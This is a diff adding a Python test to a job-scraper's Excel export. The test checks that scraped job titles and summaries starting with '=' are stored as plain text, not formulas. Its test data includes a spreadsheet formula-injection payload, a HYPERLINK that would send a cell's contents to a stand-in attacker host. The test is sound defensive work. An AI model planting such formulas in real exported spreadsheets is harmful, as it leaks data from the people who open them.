@@ -190,3 +190,29 @@ def test_print_setup_is_landscape_fit_to_width(tmp_path):
     ws = load_workbook(path)["Jobs"]
     assert ws.page_setup.orientation == "landscape"
     assert ws.print_title_rows == "$1:$1"  # openpyxl normalises "1:1" on save
+
+
+def test_scraped_text_starting_with_equals_is_not_a_formula(tmp_path):
+    # Job titles come from public marketplaces, so anyone can post one that
+    # looks like a formula. It must land in the workbook as inert text.
+    payload = '=HYPERLINK("http://evil.example/?"&A2,"click")'
+    job = JobPosting(
+        platform="mostaql",
+        job_title=payload,
+        job_url="https://mostaql.com/project/2",
+        posted_date=NOW,
+        match_score=90,
+    )
+    job.ai_summary = "=1+1"
+    path = export([job], tmp_path, now=NOW)
+    wb = load_workbook(path)
+
+    jobs_ws = wb["Jobs"]
+    title = jobs_ws.cell(row=2, column=_col("job_title"))
+    summary = jobs_ws.cell(row=2, column=_col("ai_summary"))
+    assert (title.value, title.data_type) == (payload, "s")
+    assert (summary.value, summary.data_type) == ("=1+1", "s")
+
+    summary_ws = wb["Summary"]
+    top_titles = [c for c in summary_ws["C"] if c.value == payload]
+    assert top_titles and all(c.data_type == "s" for c in top_titles)
